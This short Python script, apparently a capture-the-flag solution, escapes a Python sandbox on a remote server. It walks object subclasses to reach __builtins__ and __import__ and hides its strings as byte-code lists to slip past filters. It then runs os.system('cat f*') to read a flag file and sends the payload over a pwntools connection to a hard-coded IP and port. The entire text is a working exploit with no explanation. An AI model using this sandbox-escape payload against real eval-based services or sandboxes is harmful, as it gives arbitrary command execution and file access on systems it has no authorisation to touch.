from pwn import remote

cmd = "cat f*"

def c(string):
    string = ",".join([str(ord(x)) for x in string])

    # __builtins__ -> 95,95,98,117,105,108,116,105,110,115,95,95
    # print(string)

    built = f"().__class__.__base__.__subclasses__()[6]([{string}]).decode()" # bytes([list of bytes]).decode()
    return built

payload = f"().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__[{c('__builtins__')}][{c('__import__')}]({c('os')}).system({c(cmd)})"
# ().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat f*")

# print(payload)

# connect to the server and send the payload
io = remote("188.166.156.174", 30022)
io.recvuntil(">>> ")
io.sendline(payload)
io.interactive()